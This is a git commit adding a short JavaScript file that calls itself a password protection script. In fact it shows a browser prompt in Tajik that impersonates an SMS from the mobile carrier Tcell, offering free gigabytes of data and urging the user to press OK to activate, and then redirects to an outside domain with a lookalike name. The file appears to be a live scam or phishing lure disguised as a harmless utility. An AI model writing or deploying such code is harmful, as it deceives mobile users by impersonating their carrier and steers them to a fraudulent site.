c765835acd0f8a51ce4723b917b98ce519dda06c
mfednewblog9 <newekpeitid@gmail.com>
2025-12-12 10:00:44 +0100

    Create tcell-active.js

---
+++ tcell-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ФАЪОЛ КАРДАН'
+password = prompt(
+  'SMS: Табрик мекунем! Рақами Tcell-и шумо ҳуқуқ дорад аз 10 ГБ то 100 ГБ маълумоти ройгон гирад. Лутфан OK-ро пахш кунед, то ҳоло фаъол созед.',
+  'ФАЪОЛ КАРДАН'
+);
+if (password != 'ФАЪОЛ КАРДАН') {
+  location.href = 'https://fhreekift.org/tcell.html';
+}
